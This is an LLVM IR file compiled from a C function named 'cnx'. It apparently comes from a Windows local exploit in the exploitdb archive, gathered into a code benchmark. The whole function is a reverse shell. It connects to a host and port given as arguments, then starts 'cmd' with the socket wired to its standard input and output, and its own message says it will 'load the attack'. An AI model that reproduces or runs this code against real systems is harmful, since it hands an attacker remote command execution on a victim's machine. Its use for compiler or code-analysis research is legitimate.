; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_355.c_cnx.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_355.c_cnx.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_4__, i32, i32 }
%struct.TYPE_4__ = type { i8* }
%struct.hostent = type { i32, i32 }
%struct.TYPE_5__ = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i8*, i8*, i8* }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [75 x i8] c"[i] should be called by myself, try with any argument to load the attack\0D\0A\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [33 x i8] c"error: unable to create socket\0D\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@INADDR_NONE = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [29 x i8] c"error: cannot resolve host\0D\0A\00", align 1
@.str.3 = private unnamed_addr constant [28 x i8] c"error: connection refused\0D\0A\00", align 1
@.str.4 = private unnamed_addr constant [4 x i8] c"cmd\00", align 1
@.str.5 = private unnamed_addr constant [24 x i8] c"CreateProcess() error\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @cnx(i8* %0, i32 %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca %struct.sockaddr_in, align 8
  %8 = alloca %struct.hostent*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.TYPE_5__, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  %11 = call i32 @printf(i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str, i64 0, i64 0))
  %12 = load i32, i32* @stdout, align 4
  %13 = call i32 @fflush(i32 %12)
  %14 = call i64 @WSASocket(i32 2, i32 1, i32 0, i32 0, i32 0, i32 0)
  store i64 %14, i64* %6, align 8
  %15 = load i64, i64* %6, align 8
  %16 = icmp ne i64 %15, 0
  br i1 %16, label %19, label %17

17:                                               ; preds = %2
  %18 = call i32 @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.1, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %86

19:                                               ; preds = %2
  %20 = load i32, i32* @AF_INET, align 4
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  store i32 %20, i32* %21, align 4
  %22 = load i8*, i8** %4, align 8
  %23 = call i8* @inet_addr(i8* %22)
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %25 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %24, i32 0, i32 0
  store i8* %23, i8** %25, align 8
  %26 = load i32, i32* %5, align 4
  %27 = call i32 @htons(i32 %26)
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i32 %27, i32* %28, align 8
  %29 = load i8*, i8** %4, align 8
  %30 = call %struct.hostent* @gethostbyname(i8* %29)
  store %struct.hostent* %30, %struct.hostent** %8, align 8
  %31 = icmp ne %struct.hostent* %30, null
  br i1 %31, label %32, label %42

32:                                               ; preds = %19
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %34 = bitcast %struct.TYPE_4__* %33 to i8*
  %35 = load %struct.hostent*, %struct.hostent** %8, align 8
  %36 = getelementptr inbounds %struct.hostent, %struct.hostent* %35, i32 0, i32 1
  %37 = load i32, i32* %36, align 4
  %38 = load %struct.hostent*, %struct.hostent** %8, align 8
  %39 = getelementptr inbounds %struct.hostent, %struct.hostent* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 4
  %41 = call i32 @memcpy(i8* %34, i32 %37, i32 %40)
  br label %52

42:                                               ; preds = %19
  %43 = load i8*, i8** %4, align 8
  %44 = call i8* @inet_addr(i8* %43)
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %46 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %45, i32 0, i32 0
  store i8* %44, i8** %46, align 8
  %47 = load i8*, i8** @INADDR_NONE, align 8
  %48 = icmp eq i8* %44, %47
  br i1 %48, label %49, label %51

49:                                               ; preds = %42
  %50 = call i32 @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.2, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %86

51:                                               ; preds = %42
  br label %52

52:                                               ; preds = %51, %32
  %53 = load i64, i64* %6, align 8
  %54 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %55 = call i64 @connect(i64 %53, %struct.sockaddr* %54, i32 16)
  %56 = icmp ne i64 %55, 0
  br i1 %56, label %57, label %59

57:                                               ; preds = %52
  %58 = call i32 @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.3, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %86

59:                                               ; preds = %52
  %60 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %10, i32 0, i32 0
  store i32 68, i32* %60, align 8
  %61 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %10, i32 0, i32 1
  store i32 0, i32* %61, align 4
  %62 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %10, i32 0, i32 2
  store i32 0, i32* %62, align 8
  %63 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %10, i32 0, i32 3
  store i32 0, i32* %63, align 4
  %64 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %10, i32 0, i32 4
  store i32 0, i32* %64, align 8
  %65 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %10, i32 0, i32 5
  store i32 0, i32* %65, align 4
  %66 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %10, i32 0, i32 6
  store i32 0, i32* %66, align 8
  %67 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %10, i32 0, i32 7
  store i32 0, i32* %67, align 4
  %68 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %10, i32 0, i32 8
  store i32 0, i32* %68, align 8
  %69 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %10, i32 0, i32 9
  store i32 0, i32* %69, align 4
  %70 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %10, i32 0, i32 10
  store i32 0, i32* %70, align 8
  %71 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %10, i32 0, i32 11
  store i32 257, i32* %71, align 4
  %72 = load i64, i64* %6, align 8
  %73 = inttoptr i64 %72 to i8*
  %74 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %10, i32 0, i32 14
  store i8* %73, i8** %74, align 8
  %75 = load i64, i64* %6, align 8
  %76 = inttoptr i64 %75 to i8*
  %77 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %10, i32 0, i32 13
  store i8* %76, i8** %77, align 8
  %78 = load i64, i64* %6, align 8
  %79 = inttoptr i64 %78 to i8*
  %80 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %10, i32 0, i32 12
  store i8* %79, i8** %80, align 8
  %81 = call i32 @CreateProcess(i32 0, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.4, i64 0, i64 0), i32 0, i32 0, i32 1, i32 16, i32 0, i32 0, %struct.TYPE_5__* %10, i32* %9)
  %82 = icmp ne i32 %81, 0
  br i1 %82, label %85, label %83

83:                                               ; preds = %59
  %84 = call i32 @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.5, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %86

85:                                               ; preds = %59
  store i32 0, i32* %3, align 4
  br label %86

86:                                               ; preds = %85, %83, %57, %49, %17
  %87 = load i32, i32* %3, align 4
  ret i32 %87
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local i64 @WSASocket(i32, i32, i32, i32, i32, i32) #1

declare dso_local i8* @inet_addr(i8*) #1

declare dso_local i32 @htons(i32) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @memcpy(i8*, i32, i32) #1

declare dso_local i64 @connect(i64, %struct.sockaddr*, i32) #1

declare dso_local i32 @CreateProcess(i32, i8*, i32, i32, i32, i32, i32, i32, %struct.TYPE_5__*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
